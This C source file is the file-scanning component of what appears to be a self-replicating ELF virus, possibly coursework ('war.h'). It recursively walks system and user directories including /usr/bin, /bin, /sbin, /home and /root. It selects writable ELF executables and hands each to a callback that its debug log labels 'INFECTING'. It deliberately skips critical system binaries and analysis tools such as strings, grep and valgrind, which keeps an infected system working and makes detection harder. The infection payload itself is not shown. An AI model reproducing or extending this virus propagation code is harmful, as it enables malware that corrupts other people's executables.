#include "../../include/scanner.h"
#include "../../include/war.h"
#include <stdio.h>
#include <errno.h>
#include <limits.h>

// Debug siempre activo para encontrar el problema
#define DEBUG_SCANNER(fmt, ...) fprintf(stderr, "[SCANNER] " fmt "\n", ##__VA_ARGS__)

bool is_elf64_file(const char *filepath)
{
    int fd;
    unsigned char magic[5];
    ssize_t bytes_read;
    
    // IMPORTANTE: Usar open() estándar, NO custom_open
    fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        DEBUG_SCANNER("  is_elf64: FAILED to open %s (errno=%d: %s)", 
                      filepath, errno, strerror(errno));
        return false;
    }
    
    bytes_read = read(fd, magic, 5);
    close(fd);
    
    if (bytes_read != 5) {
        DEBUG_SCANNER("  is_elf64: FAILED to read magic from %s (got %zd bytes)", 
                      filepath, bytes_read);
        return false;
    }
    
    bool result = (magic[0] == 0x7f && magic[1] == 'E' && 
                   magic[2] == 'L' && magic[3] == 'F' && magic[4] == 2);
    
    DEBUG_SCANNER("  is_elf64: %s -> magic=[%02x %02x %02x %02x %02x] -> %s", 
                  filepath, magic[0], magic[1], magic[2], magic[3], magic[4],
                  result ? "YES" : "NO");
    return result;
}

bool is_elf32_file(const char *filepath) {
    int fd;
    unsigned char magic[5];
    ssize_t bytes_read;
    
    fd = open(filepath, O_RDONLY);
    if (fd < 0) {
        DEBUG_SCANNER("  is_elf32: FAILED to open %s (errno=%d)", filepath, errno);
        return false;
    }
    
    bytes_read = read(fd, magic, 5);
    close(fd);
    
    if (bytes_read != 5) {
        return false;
    }
    
    bool result = (magic[0] == 0x7f && magic[1] == 'E' && 
                   magic[2] == 'L' && magic[3] == 'F' && magic[4] == 1);
    
    DEBUG_SCANNER("  is_elf32: %s -> %s", filepath, result ? "YES" : "NO");
    return result;
}

int scanner_engine_run(scan_strategy_t strategy, t_config *cfg, scan_callback_fn callback) {
    DEBUG_SCANNER("scanner_engine_run: strategy=%d, recursive=%d", 
                  strategy, cfg ? cfg->enable_recursive : -1);
    
    if (!cfg || !callback) {
        DEBUG_SCANNER("ERROR: cfg=%p callback=%p", (void*)cfg, (void*)callback);
        return -1;
    }
    
    switch (strategy) {
        case SCAN_STRATEGY_SIMPLE:
            DEBUG_SCANNER("Using SIMPLE strategy");
            return scanner_simple(cfg, callback);
        
        case SCAN_STRATEGY_RECURSIVE:
            if (!cfg->enable_recursive) {
                DEBUG_SCANNER("Recursive disabled, falling back to SIMPLE");
                return scanner_simple(cfg, callback);
            }
            DEBUG_SCANNER("Using RECURSIVE strategy");
            return scanner_recursive(cfg, callback);
        
        default:
            DEBUG_SCANNER("ERROR: Unknown strategy %d", strategy);
            return -1;
    }
}

int scanner_simple(t_config *cfg, scan_callback_fn callback) {
    DEBUG_SCANNER("=== SCANNER SIMPLE START ===");
    DEBUG_SCANNER("  num_dirs=%d", cfg->num_dirs);
    
    int total_processed = 0;
    
    for (int i = 0; i < cfg->num_dirs; i++) {
        DEBUG_SCANNER("  Opening directory: %s", cfg->target_dirs[i]);
        
        DIR *dir = opendir(cfg->target_dirs[i]);
        if (!dir) {
            DEBUG_SCANNER("    ERROR: Cannot open (errno=%d: %s)", 
                          errno, strerror(errno));
            continue;
        }
        
        struct dirent *entry;
        int files_in_dir = 0;
        
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || 
                strcmp(entry->d_name, "..") == 0) {
                continue;
            }
            
            char filepath[1024];
            snprintf(filepath, sizeof(filepath), "%s/%s", 
                     cfg->target_dirs[i], entry->d_name);
            
            DEBUG_SCANNER("    Checking: %s", filepath);
            
            struct stat st;
            if (stat(filepath, &st) < 0) {
                DEBUG_SCANNER("      stat() failed: %s", strerror(errno));
                continue;
            }
            
            if (!S_ISREG(st.st_mode)) {
                DEBUG_SCANNER("      Not a regular file (mode=%o)", st.st_mode);
                continue;
            }
            
            DEBUG_SCANNER("      Is regular file, calling callback...");
            callback(filepath, cfg);
            files_in_dir++;
            total_processed++;
        }
        
        closedir(dir);
        DEBUG_SCANNER("  Processed %d files in %s", files_in_dir, cfg->target_dirs[i]);
    }
    
    DEBUG_SCANNER("=== SCANNER SIMPLE END (total: %d) ===", total_processed);
    return total_processed;
}

// ============================================================================
// RECURSIVE SCANNER
// ============================================================================

static const char *skip_dirs[] = {
    "/proc", "/sys", "/dev", "/run",
    "/boot",
    "/lib", "/lib64", "/lib32",
    "/usr/lib", "/usr/lib64", "/usr/lib32",
    "/usr/libexec",
    "/lost+found", "/mnt", "/media", "/cdrom", "/snap",
    "/usr/lib/systemd", "/usr/lib/openrc",
    "/etc", "/usr/share", "/var/lib", "/var/cache",
    NULL
};

static const char *critical_binaries[] = {
    "sshd", "ssh", "init", "systemd", "openrc",
    "login", "su", "sudo", "doas",
    "busybox", "ash", "sh", "bash", "dash",
    "kill", "killall", "killall5",
    "rc", "rc-service", "rc-update",
    "getty", "agetty",
    "mount", "umount", "fsck",
    "modprobe", "udevd", "mdev",
    "dhcpcd", "iptables", "nftables", "strings", "find", "grep", "valgrind",
    NULL
};

static bool is_shared_library(const char *filepath) {
    const char *basename = strrchr(filepath, '/');
    basename = basename ? basename + 1 : filepath;
    return (strstr(basename, ".so") != NULL);
}

static bool should_skip_binary(const char *filepath) {
    const char *basename = strrchr(filepath, '/');
    basename = basename ? basename + 1 : filepath;
    
    for (int i = 0; critical_binaries[i] != NULL; i++) {
        if (strcmp(basename, critical_binaries[i]) == 0) {
            return true;
        }
    }
    return false;
}

static bool should_skip_dir(const char *path) {
    for (int i = 0; skip_dirs[i] != NULL; i++) {
        size_t len = strlen(skip_dirs[i]);
        if (strcmp(path, skip_dirs[i]) == 0 ||
            (strncmp(path, skip_dirs[i], len) == 0 && path[len] == '/')) {
            return true;
        }
    }
    return false;
}

typedef struct {
    int infected_count;
    int max_files;
    t_config *cfg;
    scan_callback_fn callback;
} scan_context_t;

static int scan_recursive_internal(const char *dir_path, int depth, 
                                    scan_context_t *ctx) {
    if (depth > ctx->cfg->max_depth) {
        return 0;
    }
    
    if (ctx->max_files > 0 && ctx->infected_count >= ctx->max_files) {
        return 0;
    }
    
    if (should_skip_dir(dir_path)) {
        return 0;
    }
    
    DIR *dir = opendir(dir_path);
    if (!dir) {
        return 0;
    }
    
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || 
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        if (ctx->max_files > 0 && ctx->infected_count >= ctx->max_files) {
            break;
        }
        
        char filepath[PATH_MAX];
        int len = snprintf(filepath, sizeof(filepath), "%s/%s", 
                          dir_path, entry->d_name);
        if (len >= (int)sizeof(filepath)) {
            continue;
        }
        
        struct stat st;
        if (lstat(filepath, &st) < 0) {
            continue;
        }
        
        if (S_ISLNK(st.st_mode)) {
            continue;
        }
        
        if (S_ISDIR(st.st_mode)) {
            scan_recursive_internal(filepath, depth + 1, ctx);
        }
        else if (S_ISREG(st.st_mode)) {
            bool is_executable = (st.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH)) != 0;
            
            if (!is_executable) {
                continue;
            }
            
            if (access(filepath, W_OK) != 0) {
                continue;
            }
            
            if (should_skip_binary(filepath)) {
                continue;
            }
            
            if (is_shared_library(filepath)) {
                continue;
            }
            
            bool is_elf = false;
            if (ctx->cfg->enable_32bit) {
                is_elf = is_elf64_file(filepath) || is_elf32_file(filepath);
            } else {
                is_elf = is_elf64_file(filepath);
            }
            
            if (is_elf) {
                DEBUG_SCANNER("  INFECTING: %s", filepath);
                ctx->callback(filepath, ctx->cfg);
                ctx->infected_count++;
            }
        }
    }
    
    closedir(dir);
    return 0;
}

int scanner_recursive(t_config *cfg, scan_callback_fn callback) {
    if (!cfg || !callback) return -1;
    
    DEBUG_SCANNER("=== RECURSIVE SCAN START ===");
    DEBUG_SCANNER("  UID=%d (root=%d)", getuid(), (getuid() == 0));
    DEBUG_SCANNER("  max_depth=%d, max_files=%d", cfg->max_depth, cfg->max_files);
    
    if (getuid() != 0) {
        DEBUG_SCANNER("  WARNING: Not root - limited access");
    }
    
    scan_context_t ctx = {
        .infected_count = 0,
        .max_files = cfg->max_files,
        .cfg = cfg,
        .callback = callback
    };
    
    const char *targets[] = {
        "/tmp",
        "/var/tmp",
        "/home",
        "/root",
        "/opt",
        "/usr/local/bin",
        "/usr/bin",
        "/bin",
        "/sbin",
        NULL
    };
    
    for (int i = 0; targets[i] != NULL; i++) {
        if (access(targets[i], R_OK | X_OK) != 0) {
            DEBUG_SCANNER("  Skipping %s (no access)", targets[i]);
            continue;
        }
        
        DEBUG_SCANNER("  Scanning: %s", targets[i]);
        scan_recursive_internal(targets[i], 0, &ctx);
        
        if (ctx.max_files > 0 && ctx.infected_count >= ctx.max_files) {
            break;
        }
    }
    
    DEBUG_SCANNER("=== RECURSIVE SCAN END (infected: %d) ===", ctx.infected_count);
    
    return ctx.infected_count;
}